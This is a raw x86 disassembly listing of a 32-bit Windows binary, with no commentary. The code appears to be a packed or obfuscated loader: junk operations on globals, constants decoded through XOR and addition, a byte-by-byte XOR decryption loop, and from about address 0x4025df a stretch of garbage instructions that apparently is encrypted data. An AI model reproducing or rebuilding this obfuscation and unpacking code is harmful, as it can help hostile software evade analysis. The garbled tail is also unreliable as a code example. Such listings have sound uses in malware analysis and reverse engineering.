  401df8:	xor    DWORD PTR ds:0x434008,0x435014
  401e02:	push   0x43a520
  401e07:	push   ebx
  401e08:	push   ebx
  401e09:	call   DWORD PTR ds:0x43a8fc
  401e0f:	test   eax,eax
  401e11:	mov    DWORD PTR ds:0x435004,0x62c7
  401e1b:	jne    0x40241c
  401e21:	sub    DWORD PTR ds:0x437000,0x3add
  401e2b:	push   0xd
  401e2d:	push   0x43a530
  401e32:	call   DWORD PTR ds:0x43a908
  401e38:	test   eax,eax
  401e3a:	mov    DWORD PTR ds:0x435010,0x130a
  401e44:	jne    0x402440
  401e4a:	and    DWORD PTR ds:0x434018,0x434024
  401e54:	push   0x43a544
  401e59:	push   ebx
  401e5a:	push   ebx
  401e5b:	call   DWORD PTR ds:0x43a8ec
  401e61:	test   eax,eax
  401e63:	mov    DWORD PTR ds:0x436008,0x3823
  401e6d:	jne    0x402440
  401e73:	adc    DWORD PTR ds:0x436014,0x437014
  401e7d:	push   0x9
  401e7f:	sub    DWORD PTR ds:0x437014,0x437010
  401e89:	push   0x43a55c
  401e8e:	call   DWORD PTR ds:0x43a8cc
  401e94:	not    DWORD PTR ds:0x43800c
  401e9a:	test   eax,eax
  401e9c:	mov    DWORD PTR ds:0x43501c,0x69de
  401ea6:	jne    0x40241c
  401eac:	sbb    DWORD PTR ds:0x436018,0x435008
  401eb6:	push   0x43a578
  401ebb:	push   ebx
  401ebc:	sub    DWORD PTR ds:0x438018,0x435008
  401ec6:	push   ebx
  401ec7:	call   DWORD PTR ds:0x43a8fc
  401ecd:	test   eax,eax
  401ecf:	mov    DWORD PTR ds:0x435018,0x17d7
  401ed9:	jne    0x40241c
  401edf:	sub    DWORD PTR ds:0x436010,0x435008
  401ee9:	push   0xd
  401eeb:	adc    DWORD PTR ds:0x43700c,0x43400c
  401ef5:	push   0x43a588
  401efa:	sbb    DWORD PTR ds:0x437014,0x437000
  401f04:	call   DWORD PTR ds:0x43a908
  401f0a:	test   eax,eax
  401f0c:	mov    DWORD PTR ds:0x434024,0x6a5c
  401f16:	jne    0x402440
  401f1c:	mov    eax,DWORD PTR [ebp-0x8]
  401f1f:	and    DWORD PTR ds:0x43500c,0x0
  401f29:	mov    ecx,DWORD PTR ds:0x43500c
  401f2f:	inc    ecx
  401f30:	mov    DWORD PTR ds:0x43500c,ecx
  401f36:	cmp    DWORD PTR ds:0x43500c,0x9
  401f3d:	ja     0x401f75
  401f43:	jmp    0x401f4e
  401f48:	call   DWORD PTR ds:0x43a904
  401f4e:	cmp    DWORD PTR ds:0x43500c,0x8
  401f55:	jne    0x401f68
  401f5b:	mov    ecx,DWORD PTR ds:0x43500c
  401f61:	inc    ecx
  401f62:	mov    DWORD PTR ds:0x43500c,ecx
  401f68:	cmp    DWORD PTR ds:0x43500c,0x14
  401f6f:	jb     0x401f29
  401f75:	mov    ecx,DWORD PTR [ebp-0x7c]
  401f78:	xor    eax,esi
  401f7a:	dec    DWORD PTR ds:0x43700c
  401f80:	add    eax,edi
  401f82:	mov    DWORD PTR ds:0x434010,0x1014
  401f8c:	cmp    eax,ecx
  401f8e:	jne    0x4023c3
  401f94:	sbb    DWORD PTR ds:0x437018,0x6417
  401f9e:	mov    eax,DWORD PTR [ebp-0x8]
  401fa1:	mov    ecx,DWORD PTR ds:0x43a2d4
  401fa7:	and    DWORD PTR ds:0x438014,0xc31
  401fb1:	mov    ecx,DWORD PTR [ecx+0x198]
  401fb7:	xor    eax,esi
  401fb9:	sub    DWORD PTR ds:0x436008,0x435010
  401fc3:	add    eax,edi
  401fc5:	cmp    eax,DWORD PTR [ecx]
  401fc7:	jne    0x402025
  401fcd:	movzx  eax,WORD PTR ds:0x435014
  401fd4:	and    DWORD PTR ds:0x434010,eax
  401fda:	mov    eax,DWORD PTR [ebp-0x8]
  401fdd:	adc    DWORD PTR ds:0x434018,0x436008
  401fe7:	push   0xf89c8585
  401fec:	xor    eax,esi
  401fee:	add    eax,edi
  401ff0:	adc    DWORD PTR ds:0x437018,0x127f
  401ffa:	push   eax
  401ffb:	dec    DWORD PTR ds:0x436004
  402001:	push   0xf89c85b9
  402006:	sbb    DWORD PTR ds:0x43501c,0x43600c
  402010:	push   DWORD PTR [ebp-0xc]
  402013:	and    DWORD PTR ds:0x434024,0x7b2c
  40201d:	push   DWORD PTR [ebp-0x8]
  402020:	call   0x407a51
  402025:	mov    eax,DWORD PTR [ebp-0xc]
  402028:	mov    DWORD PTR [ebp-0x4c],eax
  40202b:	mov    eax,DWORD PTR [ebp-0x8]
  40202e:	mov    DWORD PTR [ebp-0x60],eax
  402031:	mov    eax,DWORD PTR [ebp-0x60]
  402034:	xor    eax,esi
  402036:	add    eax,edi
  402038:	mov    DWORD PTR [ebp+0x10],eax
  40203b:	mov    eax,ds:0x43a154
  402040:	mov    eax,DWORD PTR [eax]
  402042:	mov    DWORD PTR [ebp+0x10],eax
  402045:	mov    eax,ds:0x43a35c
  40204a:	mov    eax,DWORD PTR [eax]
  40204c:	mov    DWORD PTR [ebp-0x18],eax
  40204f:	mov    DWORD PTR [ebp+0xc],0xf89c8785
  402056:	mov    eax,DWORD PTR [ebp+0xc]
  402059:	xor    eax,esi
  40205b:	add    eax,edi
  40205d:	mov    DWORD PTR [ebp+0xc],eax
  402060:	mov    eax,ds:0x43a2d4
  402065:	mov    DWORD PTR [ebp+0xc],eax
  402068:	mov    eax,DWORD PTR [ebp+0x10]
  40206b:	mov    DWORD PTR [ebp+0xc],eax
  40206e:	mov    eax,DWORD PTR [ebp+0xc]
  402071:	push   0x4
  402073:	pop    ecx
  402074:	sub    ecx,eax
  402076:	add    ecx,DWORD PTR [ebp-0x18]
  402079:	mov    DWORD PTR [ebp-0x38],0xf89c85c5
  402080:	mov    DWORD PTR [ebp+0x10],ecx
  402083:	mov    DWORD PTR [ebp-0x108],0xf89c85b9
  40208d:	mov    eax,DWORD PTR [ebp+0xc]
  402090:	mov    DWORD PTR [ebp-0x104],eax
  402096:	mov    eax,DWORD PTR [ebp+0x10]
  402099:	mov    DWORD PTR [ebp-0x100],eax
  40209f:	mov    eax,DWORD PTR [ebp-0x38]
  4020a2:	xor    eax,esi
  4020a4:	add    eax,edi
  4020a6:	mov    DWORD PTR [ebp-0xfc],eax
  4020ac:	lea    eax,[ebp-0x98]
  4020b2:	mov    DWORD PTR [ebp-0xf8],eax
  4020b8:	mov    eax,DWORD PTR [ebp-0x108]
  4020be:	xor    eax,esi
  4020c0:	add    eax,edi
  4020c2:	mov    DWORD PTR [ebp-0x108],eax
  4020c8:	lea    eax,[ebp-0x108]
  4020ce:	push   eax
  4020cf:	mov    eax,DWORD PTR [ebp-0x4c]
  4020d2:	xor    eax,esi
  4020d4:	add    eax,edi
  4020d6:	push   eax
  4020d7:	mov    eax,ds:0x43a2f4
  4020dc:	push   0x43a24a
  4020e1:	push   DWORD PTR [eax]
  4020e3:	call   0x404c64
  4020e8:	mov    eax,DWORD PTR [ebp+0xc]
  4020eb:	mov    ecx,DWORD PTR [ebp+0x10]
  4020ee:	mov    DWORD PTR [ebp-0x84],ecx
  4020f4:	mov    ecx,DWORD PTR [ebp-0x60]
  4020f7:	xor    ecx,esi
  4020f9:	mov    DWORD PTR [ebp-0x18],eax
  4020fc:	add    ecx,edi
  4020fe:	jmp    0x402361
  402103:	lea    edx,[ecx+eax*1]
  402106:	mov    DWORD PTR [ebp+0x10],edx
  402109:	mov    edx,DWORD PTR [ebp-0x84]
  40210f:	sub    edx,ecx
  402111:	mov    DWORD PTR [ebp+0xc],edx
  402114:	mov    edx,DWORD PTR [ebp+0xc]
  402117:	mov    DWORD PTR [ebp-0x54],edx
  40211a:	mov    edx,DWORD PTR [ebp+0x10]
  40211d:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  402124:	mov    DWORD PTR [ebp-0x6c],edx
  402127:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  40212e:	mov    edx,DWORD PTR [ebp-0x50]
  402131:	xor    edx,esi
  402133:	add    edx,edi
  402135:	mov    DWORD PTR [ebp+0x10],edx
  402138:	mov    edx,DWORD PTR [ebp-0x50]
  40213b:	xor    edx,esi
  40213d:	add    edx,edi
  40213f:	mov    DWORD PTR [ebp+0xc],edx
  402142:	mov    DWORD PTR [ebp-0x68],0xf89c85a5
  402149:	mov    DWORD PTR [ebp-0x74],0xf89c85be
  402150:	mov    edx,DWORD PTR [ebp-0x50]
  402153:	mov    ebx,DWORD PTR [ebp-0x54]
  402156:	xor    edx,esi
  402158:	add    edx,edi
  40215a:	cmp    ebx,edx
  40215c:	je     0x402355
  402162:	mov    eax,DWORD PTR [ebp-0x24]
  402165:	xor    eax,esi
  402167:	mov    edx,0xffcd8d1e
  40216c:	sub    edx,eax
  40216e:	add    edx,DWORD PTR [ebp-0x54]
  402171:	mov    eax,DWORD PTR [ebp-0x24]
  402174:	mov    ebx,DWORD PTR [ebp+0x10]
  402177:	xor    eax,esi
  402179:	add    eax,edi
  40217b:	imul   eax,ebx
  40217e:	cmp    eax,edx
  402180:	ja     0x402352
  402186:	mov    edx,DWORD PTR [ebp+0x10]
  402189:	mov    eax,DWORD PTR [ebp-0x54]
  40218c:	mov    ebx,DWORD PTR [ebp-0x68]
  40218f:	sub    eax,edx
  402191:	xor    ebx,esi
  402193:	xor    edx,edx
  402195:	add    ebx,edi
  402197:	div    ebx
  402199:	mov    DWORD PTR [ebp+0xc],eax
  40219c:	mov    eax,DWORD PTR [ebp-0x74]
  40219f:	mov    edx,DWORD PTR [ebp+0xc]
  4021a2:	xor    eax,esi
  4021a4:	add    eax,edi
  4021a6:	cmp    edx,eax
  4021a8:	jbe    0x4021b8
  4021ae:	mov    eax,DWORD PTR [ebp-0x74]
  4021b1:	xor    eax,esi
  4021b3:	add    eax,edi
  4021b5:	mov    DWORD PTR [ebp+0xc],eax
  4021b8:	mov    eax,DWORD PTR [ebp-0x68]
  4021bb:	mov    edx,DWORD PTR [ebp+0xc]
  4021be:	xor    eax,esi
  4021c0:	add    eax,edi
  4021c2:	imul   eax,edx
  4021c5:	mov    DWORD PTR [ebp+0xc],eax
  4021c8:	mov    eax,DWORD PTR [ebp-0x50]
  4021cb:	mov    edx,DWORD PTR [ebp+0xc]
  4021ce:	xor    eax,esi
  4021d0:	add    eax,edi
  4021d2:	cmp    edx,eax
  4021d4:	je     0x40233b
  4021da:	mov    eax,DWORD PTR [ebp+0xc]
  4021dd:	mov    DWORD PTR [ebp-0x3c],eax
  4021e0:	mov    eax,DWORD PTR [ebp+0x10]
  4021e3:	add    eax,DWORD PTR [ebp-0x6c]
  4021e6:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  4021ed:	mov    DWORD PTR [ebp-0x30],eax
  4021f0:	mov    eax,0xf89c8584
  4021f5:	mov    DWORD PTR [ebp-0x64],eax
  4021f8:	mov    DWORD PTR [ebp-0x58],0xf89c85bb
  4021ff:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  402206:	mov    DWORD PTR [ebp-0x2c],eax
  402209:	mov    eax,DWORD PTR [ebp-0x38]
  40220c:	xor    eax,esi
  40220e:	add    eax,edi
  402210:	jmp    0x4022f7
  402215:	mov    DWORD PTR [ebp-0x78],0xf89c85b3
  40221c:	mov    DWORD PTR [ebp-0x80],0xf89c85a9
  402223:	mov    eax,DWORD PTR [ebp-0x2c]
  402226:	mov    edx,DWORD PTR [ebp+0xc]
  402229:	xor    eax,esi
  40222b:	add    eax,edi
  40222d:	imul   eax,edx
  402230:	mov    edx,DWORD PTR [ebp-0x30]
  402233:	mov    al,BYTE PTR [eax+edx*1]
  402236:	mov    BYTE PTR [ebp-0x1],al
  402239:	mov    eax,DWORD PTR [ebp-0x2c]
  40223c:	mov    edx,DWORD PTR [ebp+0xc]
  40223f:	xor    eax,esi
  402241:	add    eax,edi
  402243:	imul   eax,edx
  402246:	mov    edx,DWORD PTR [ebp-0x58]
  402249:	xor    edx,esi
  40224b:	add    eax,edx
  40224d:	mov    edx,DWORD PTR [ebp-0x30]
  402250:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e2]
  402258:	mov    edx,DWORD PTR [ebp-0x78]
  40225b:	xor    edx,esi
  40225d:	lea    eax,[edx+eax*1+0x3272e2]
  402264:	movzx  edx,BYTE PTR [ebp-0x1]
  402268:	xor    edx,eax
  40226a:	mov    BYTE PTR [ebp-0x1],dl
  40226d:	mov    al,BYTE PTR [ebp-0x1]
  402270:	mov    edx,DWORD PTR [ebp-0x2c]
  402273:	mov    ebx,DWORD PTR [ebp+0xc]
  402276:	xor    edx,esi
  402278:	add    edx,edi
  40227a:	imul   edx,ebx
  40227d:	mov    ebx,DWORD PTR [ebp-0x30]
  402280:	mov    BYTE PTR [edx+ebx*1],al
  402283:	mov    eax,DWORD PTR [ebp-0x2c]
  402286:	mov    edx,DWORD PTR [ebp+0xc]
  402289:	xor    eax,esi
  40228b:	add    eax,edi
  40228d:	imul   eax,edx
  402290:	mov    edx,DWORD PTR [ebp-0x30]
  402293:	mov    al,BYTE PTR [eax+edx*1]
  402296:	mov    BYTE PTR [ebp-0x1],al
  402299:	mov    eax,DWORD PTR [ebp-0x2c]
  40229c:	mov    edx,DWORD PTR [ebp+0xc]
  40229f:	xor    eax,esi
  4022a1:	add    eax,edi
  4022a3:	imul   eax,edx
  4022a6:	mov    edx,DWORD PTR [ebp-0x64]
  4022a9:	xor    edx,esi
  4022ab:	add    eax,edx
  4022ad:	mov    edx,DWORD PTR [ebp-0x30]
  4022b0:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e2]
  4022b8:	mov    edx,DWORD PTR [ebp-0x80]
  4022bb:	xor    edx,esi
  4022bd:	lea    eax,[edx+eax*1+0x3272e2]
  4022c4:	movzx  edx,BYTE PTR [ebp-0x1]
  4022c8:	xor    edx,eax
  4022ca:	mov    BYTE PTR [ebp-0x1],dl
  4022cd:	mov    al,BYTE PTR [ebp-0x1]
  4022d0:	mov    edx,DWORD PTR [ebp-0x2c]
  4022d3:	mov    ebx,DWORD PTR [ebp+0xc]
  4022d6:	xor    edx,esi
  4022d8:	add    edx,edi
  4022da:	imul   edx,ebx
  4022dd:	mov    ebx,DWORD PTR [ebp-0x30]
  4022e0:	mov    BYTE PTR [edx+ebx*1],al
  4022e3:	mov    eax,DWORD PTR [ebp-0x10]
  4022e6:	mov    edx,DWORD PTR [ebp-0x64]
  4022e9:	xor    eax,esi
  4022eb:	xor    edx,esi
  4022ed:	add    eax,edi
  4022ef:	add    edx,edi
  4022f1:	imul   eax,edx
  4022f4:	add    eax,DWORD PTR [ebp+0xc]
  4022f7:	mov    DWORD PTR [ebp+0xc],eax
  4022fa:	mov    eax,DWORD PTR [ebp+0xc]
  4022fd:	mov    edx,DWORD PTR [ebp-0x3c]
  402300:	cmp    edx,eax
  402302:	jb     0x402215
  402308:	mov    eax,DWORD PTR [ebp-0x64]
  40230b:	mov    edx,DWORD PTR [ebp-0x3c]
  40230e:	xor    eax,esi
  402310:	add    eax,edi
  402312:	imul   eax,edx
  402315:	mov    edx,DWORD PTR [ebp-0x38]
  402318:	xor    edx,esi
  40231a:	add    edx,edi
  40231c:	or     eax,edx
  40231e:	mov    edx,DWORD PTR [ebp-0x24]
  402321:	xor    edx,esi
  402323:	add    eax,edx
  402325:	mov    edx,DWORD PTR [ebp-0x24]
  402328:	xor    edx,esi
  40232a:	add    eax,edx
  40232c:	mov    edx,DWORD PTR [ebp+0x10]
  40232f:	lea    eax,[eax+edx*1+0x64e5c4]
  402336:	jmp    0x40234a
  40233b:	mov    eax,DWORD PTR [ebp-0x24]
  40233e:	mov    edx,DWORD PTR [ebp+0x10]
  402341:	xor    eax,esi
  402343:	lea    eax,[eax+edx*1+0x3272e2]
  40234a:	mov    DWORD PTR [ebp+0x10],eax
  40234d:	jmp    0x402162
  402352:	mov    eax,DWORD PTR [ebp-0x18]
  402355:	mov    edx,DWORD PTR [ebp-0x4c]
  402358:	xor    edx,esi
  40235a:	lea    ecx,[ecx+edx*1+0x3272e2]
  402361:	lea    edx,[ecx-0x3272e2]
  402367:	xor    edx,esi
  402369:	cmp    edx,0xf89c9585
  40236f:	jne    0x402103
  402375:	mov    ecx,DWORD PTR [ebp-0x60]
  402378:	mov    edx,DWORD PTR [ebp-0x4c]
  40237b:	mov    ebx,DWORD PTR [ebp-0x60]
  40237e:	xor    edx,esi
  402380:	mov    dl,BYTE PTR [edx+eax*1+0x3272e2]
  402387:	xor    ecx,esi
  402389:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  402390:	xor    ebx,esi
  402392:	mov    BYTE PTR [ebx+eax*1+0x3272e2],dl
  402399:	mov    edx,DWORD PTR [ebp-0x4c]
  40239c:	xor    edx,esi
  40239e:	mov    BYTE PTR [edx+eax*1+0x3272e2],cl
  4023a5:	mov    eax,DWORD PTR [ebp-0x4c]
  4023a8:	mov    eax,DWORD PTR [ebp-0x8]
  4023ab:	xor    eax,esi
  4023ad:	add    eax,edi
  4023af:	mov    ds:0x43a358,eax
  4023b4:	mov    eax,DWORD PTR [ebp-0x8]
  4023b7:	xor    eax,esi
  4023b9:	add    eax,edi
  4023bb:	xor    ebx,ebx
  4023bd:	mov    ds:0x43a350,eax
  4023c2:	inc    ebx
  4023c3:	lea    eax,[ebp-0x40]
  4023c6:	mov    DWORD PTR [ebp-0x88],eax
  4023cc:	lea    eax,[ebp+0x4]
  4023cf:	mov    DWORD PTR [ebp-0x40],eax
  4023d2:	mov    eax,DWORD PTR [ebp-0x40]
  4023d5:	test   eax,eax
  4023d7:	je     0x402572
  4023dd:	push   0x43a59c
  4023e2:	push   ebx
  4023e3:	push   ebx
  4023e4:	call   DWORD PTR ds:0x43a8ec
  4023ea:	test   eax,eax
  4023ec:	jne    0x402440
  4023f2:	push   0x9
  4023f4:	push   0x43a5b4
  4023f9:	call   DWORD PTR ds:0x43a8cc
  4023ff:	test   eax,eax
  402401:	jne    0x40241c
  402407:	push   0x43a5d0
  40240c:	push   ebx
  40240d:	push   ebx
  40240e:	call   DWORD PTR ds:0x43a8fc
  402414:	test   eax,eax
  402416:	je     0x40242b
  40241c:	lea    eax,[ebp-0x20]
  40241f:	push   eax
  402420:	call   DWORD PTR ds:0x43a8bc
  402426:	jmp    0x40258d
  40242b:	push   0xd
  40242d:	push   0x43a5e0
  402432:	call   DWORD PTR ds:0x43a908
  402438:	test   eax,eax
  40243a:	je     0x402447
  402440:	xor    eax,eax
  402442:	jmp    0x40258d
  402447:	mov    DWORD PTR [ebp-0x94],0xf152c3c
  402451:	mov    DWORD PTR [ebp-0xa0],0x712ed0f
  40245b:	mov    DWORD PTR [ebp-0x8c],0x373fc2d
  402465:	mov    DWORD PTR [ebp-0x90],0x72670a1d
  40246f:	call   0x405387
  402474:	mov    eax,DWORD PTR [ebp-0x28]
  402477:	mov    eax,DWORD PTR [ebp-0xc]
  40247a:	mov    eax,DWORD PTR [ebp-0x8]
  40247d:	mov    DWORD PTR [ebp+0xc],eax
  402480:	mov    eax,eax
  402482:	mov    eax,ds:0x43a2d4
  402487:	mov    eax,DWORD PTR [eax+0x1c8]
  40248d:	mov    eax,DWORD PTR [eax]
  40248f:	cdq    
  402490:	mov    ebx,eax
  402492:	mov    eax,0xfabdbee7
  402497:	add    ebx,eax
  402499:	adc    edx,0xffffffff
  40249c:	and    DWORD PTR [ebp-0x10],0x0
  4024a0:	xor    edx,0x0
  4024a3:	mov    DWORD PTR [ebp-0x6c],edx
  4024a6:	mov    edx,DWORD PTR [ebp+0xc]
  4024a9:	mov    DWORD PTR [ebp-0x14],edx
  4024ac:	mov    ecx,0x8a29a12d
  4024b1:	xor    ebx,ecx
  4024b3:	add    DWORD PTR [ebp-0x14],eax
  4024b6:	mov    edx,DWORD PTR [ebp-0x14]
  4024b9:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4024bd:	xor    edx,ecx
  4024bf:	mov    DWORD PTR [ebp-0x5c],edx
  4024c2:	mov    edx,DWORD PTR [ebp-0x10]
  4024c5:	xor    edx,0x0
  4024c8:	mov    DWORD PTR [ebp-0x58],edx
  4024cb:	cmp    DWORD PTR [ebp-0x5c],ebx
  4024ce:	jne    0x4024e0
  4024d4:	mov    edx,DWORD PTR [ebp-0x6c]
  4024d7:	cmp    DWORD PTR [ebp-0x58],edx
  4024da:	je     0x40250f
  4024e0:	mov    edx,DWORD PTR ds:0x43a2d4
  4024e6:	mov    edx,DWORD PTR [edx+0x1c0]
  4024ec:	mov    edx,DWORD PTR [edx]
  4024ee:	xor    ebx,ebx
  4024f0:	add    edx,eax
  4024f2:	adc    ebx,0xffffffff
  4024f5:	xor    edx,ecx
  4024f7:	xor    ebx,0x0
  4024fa:	cmp    edx,0x70941fc5
  402500:	jne    0x402572
  402506:	cmp    ebx,0xffffffff
  402509:	jne    0x402572
  40250f:	mov    edx,DWORD PTR ds:0x43a350
  402515:	mov    ebx,DWORD PTR ds:0x43a358
  40251b:	xor    edx,ebx
  40251d:	mov    DWORD PTR ds:0x43a350,edx
  402523:	mov    edx,DWORD PTR [ebp-0x40]
  402526:	mov    ebx,DWORD PTR ds:0x43a350
  40252c:	add    ebx,DWORD PTR [edx]
  40252e:	mov    edx,DWORD PTR [ebp-0x40]
  402531:	mov    DWORD PTR [edx],ebx
  402533:	mov    edx,DWORD PTR [ebp+0xc]
  402536:	xor    esi,edx
  402538:	mov    edx,DWORD PTR ds:0x43a350
  40253e:	add    esi,edi
  402540:	xor    ebx,ebx
  402542:	add    esi,eax
  402544:	adc    ebx,0xffffffff
  402547:	xor    edi,edi
  402549:	xor    esi,ecx
  40254b:	xor    ebx,0x0
  40254e:	add    edx,eax
  402550:	adc    edi,0xffffffff
  402553:	xor    edx,ecx
  402555:	xor    edi,0x0
  402558:	cmp    edx,esi
  40255a:	jne    0x402572
  402560:	cmp    edi,ebx
  402562:	jne    0x402572
  402568:	mov    eax,ds:0x43a350
  40256d:	mov    ds:0x43a358,eax
  402572:	mov    eax,ds:0x43a2d4
  402577:	push   0x4
  402579:	add    eax,0x1cc
  40257e:	push   eax
  40257f:	lea    eax,[ebp-0x28]
  402582:	push   eax
  402583:	call   0x402598
  402588:	mov    eax,DWORD PTR [ebp-0x28]
  40258b:	mov    eax,DWORD PTR [eax]
  40258d:	pop    edi
  40258e:	pop    ebx
  40258f:	pop    esi
  402590:	leave  
  402591:	ret    0xc
  402594:	xor    eax,eax
  402596:	inc    eax
  402597:	ret    
  402598:	push   ebp
  402599:	mov    ebp,esp
  40259b:	sub    esp,0x10
  40259e:	mov    ecx,DWORD PTR ds:0x438004
  4025a4:	sbb    ecx,DWORD PTR ds:0x434000
  4025aa:	mov    DWORD PTR ds:0x438004,ecx
  4025b0:	mov    eax,0xf89c8585
  4025b5:	add    DWORD PTR ds:0x437018,0x7358
  4025bf:	mov    DWORD PTR [ebp-0x4],eax
  4025c2:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4025c9:	movzx  edx,WORD PTR ds:0x436014
  4025d0:	sub    DWORD PTR ds:0x43701c,edx
  4025d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4025d9:	dec    edx
  4025da:	jmp    0x404996
  4025df:	sub    DWORD PTR [edx+0x13b763cc],eax
  4025e5:	jae    0x402659
  4025e7:	xchg   ecx,eax
  4025e8:	xchg   esp,eax
  4025e9:	pop    ecx
  4025ea:	int3   
  4025eb:	in     al,0xb9
  4025ed:	lods   al,BYTE PTR ds:[esi]
  4025ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025ef:	jl     0x40266d
  4025f1:	jl     0x40266f
  4025f3:	rcr    DWORD PTR [edi+0x7c],cl
  4025f6:	jl     0x40260d
  4025f8:	cs pop ss
  4025fa:	cmp    DWORD PTR [ecx],edx
  4025fc:	and    eax,0x30652f13
  402601:	popa   
  402602:	pusha  
  402603:	daa    
  402604:	jnp    0x402672
  402606:	ins    BYTE PTR es:[edi],dx
  402607:	ins    DWORD PTR es:[edi],dx
  402608:	xor    al,0xc5
  40260a:	fdivp  st(1),st
  40260c:	push   0x42
  40260e:	arpl   WORD PTR [ecx+0x53],di
  402611:	stos   BYTE PTR es:[edi],al
  402612:	jp     0x402681
  402614:	push   ecx
  402615:	iret   
  402616:	pop    ebp
  402617:	dec    esp
  402618:	cmp    cl,BYTE PTR [esi+0x577087fc]
  40261e:	dec    ebp
  40261f:	jg     0x402658
  402621:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402627:	jmp    DWORD PTR cs:[eax-0x22]
  40262b:	cld    
  40262c:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402630:	xor    ebp,ecx
  402632:	mov    esp,0xd82b87ed
  402637:	and    DWORD PTR [ecx],0xf
  40263a:	push   ecx
  40263b:	mov    ds:0x6df7c68c,eax
  402640:	fld    QWORD PTR [esi]
  402642:	(bad)  
  402643:	or     ah,bh
  402645:	and    BYTE PTR [edx],dl
  402647:	inc    edx
  402648:	push   cs
  402649:	and    BYTE PTR [ebx+0x62],ah
  40264c:	mov    cl,0xaf
  40264e:	sub    ebx,DWORD PTR [ecx+0x5]
  402651:	mov    al,ds:0x2341e1ff
  402656:	jbe    0x40268c
  402658:	ret    0xf153
  40265b:	sbb    al,0xfc
  40265d:	jb     0x402618
  40265f:	jnp    0x40263e
  402661:	xchg   edx,eax
  402662:	pop    edi
  402663:	cmp    DWORD PTR [ecx+0x49841607],0xb
  40266a:	cwde   
  40266b:	ds je  0x4025f9
  40266e:	add    ebx,esp
  402670:	sub    eax,0x4b368d54
  402675:	push   esi
  402676:	sti    
  402677:	iret   
  402678:	mov    WORD PTR [ecx],fs
  40267a:	or     edx,0x6982ceb7
  402680:	out    0x45,al
  402682:	push   esp
  402683:	dec    esi
  402684:	push   cs
  402685:	cmp    BYTE PTR [ebx],cl
  402687:	xor    BYTE PTR [ebx],bl
  402689:	lods   eax,DWORD PTR ds:[esi]
  40268a:	inc    ebx
  40268b:	int3   
  40268c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40268d:	dec    edx
  40268e:	fiadd  DWORD PTR [esi]
  402690:	push   eax
  402691:	std    
  402692:	push   esp
  402693:	push   eax
  402694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402695:	icebp  
  402696:	bound  edi,QWORD PTR [edi-0x2e7bb0e]
  40269c:	in     eax,0x19
  40269e:	jle    0x40269a
  4026a0:	int3   
  4026a1:	sub    eax,DWORD PTR ds:0x35c8873e
  4026a7:	add    DWORD PTR [esi+0x368a999d],esp
  4026ad:	inc    edx
  4026ae:	icebp  
  4026af:	and    bh,cl
  4026b1:	push   edi
  4026b2:	jp     0x4026d2
  4026b4:	mov    esp,0xf790333
  4026b9:	aam    0xb5
  4026bb:	push   es
  4026bc:	adc    eax,0xf9bb5f51
  4026c1:	jl     0x402688
  4026c3:	sub    ebp,edi
  4026c5:	mov    ch,0xc4
  4026c7:	fnstcw WORD PTR [ebp+0x41]
  4026ca:	mov    ds:0x8c9c079a,al
  4026cf:	jbe    0x402717
  4026d1:	outs   dx,BYTE PTR ds:[esi]
  4026d2:	add    eax,0x48a1d608
  4026d7:	pop    edi
  4026d8:	push   eax
  4026d9:	pop    edi
  4026da:	jbe    0x402668
  4026dc:	sti    
  4026dd:	sahf   
  4026de:	mov    eax,ds:0x4400e20e
  4026e3:	pushf  
  4026e4:	sub    bl,BYTE PTR [ecx+0xe2fdf07]
  4026ea:	aam    0xc5
  4026ec:	pop    esp
  4026ed:	aam    0x77
  4026ef:	or     dh,BYTE PTR [esi+0x44]
  4026f2:	sbb    esp,eax
  4026f4:	dec    ecx
  4026f5:	jp     0x4026b7
  4026f7:	ja     0x40271b
  4026f9:	mov    bh,0x16
  4026fb:	add    DWORD PTR [eax+edi*4+0x6a58e5b8],ecx
  402702:	inc    esi
  402703:	xchg   edx,eax
  402704:	aaa    
  402705:	push   ebx
  402706:	push   DWORD PTR [esi+ebp*8+0x6c078aff]
  40270d:	and    bh,cl
  40270f:	out    dx,eax
  402710:	in     al,dx
  402711:	jne    0x402780
  402713:	fldenv [eax-0x58]
  402716:	push   edi
  402717:	fwait
  402718:	mov    ecx,0xb6740de4
  40271d:	in     al,0x11
  40271f:	iret   
  402720:	push   ds
  402721:	ret    
  402722:	iret   
  402723:	out    dx,al
  402724:	int    0x4
  402726:	pop    esi
  402727:	idiv   DWORD PTR [esi]
  402729:	test   BYTE PTR [ebx+0x26],dl
  40272c:	jns    0x402789
  40272e:	mov    esi,0xd4ef15b1
  402733:	retf   0x432
  402736:	ror    BYTE PTR [ecx],0x35
  402739:	cmp    ch,cl
  40273b:	inc    eax
  40273c:	ret    0xa5a0
  40273f:	mov    edi,es
  402741:	cmp    al,0x1a
  402743:	addr16 or eax,0xfe958d2a
  402749:	es aad 0x72
  40274c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40274d:	adc    edi,esp
  40274f:	jnp    0x4026ef
  402751:	lods   al,BYTE PTR ds:[esi]
  402752:	xchg   eax,ebp
  402754:	add    bl,BYTE PTR [ecx-0x13]
  402757:	jmp    DWORD PTR [eax-0x77827b59]
  40275d:	in     al,dx
  40275e:	jb     0x4027db
  402760:	mov    ?,WORD PTR [esi]
  402762:	shl    esi,0x36
  402765:	nop
  402766:	pop    eax
  402767:	adc    cl,BYTE PTR [ecx]
  402769:	ret    
  40276a:	xchg   ebx,eax
  40276b:	push   eax
  40276c:	push   edi
  40276d:	pop    ebx
  40276e:	nop
  40276f:	out    0x95,eax
  402771:	(bad)  
  402772:	cmp    DWORD PTR [edi],ebx
  402774:	mov    es,WORD PTR fs:[eax-0x7b]
  402778:	xor    BYTE PTR [eax+0x7279e21],0x7
  40277f:	nop
  402780:	mov    ch,0xc4
  402782:	mov    esp,0x66d6ef50
  402787:	ss (bad) 
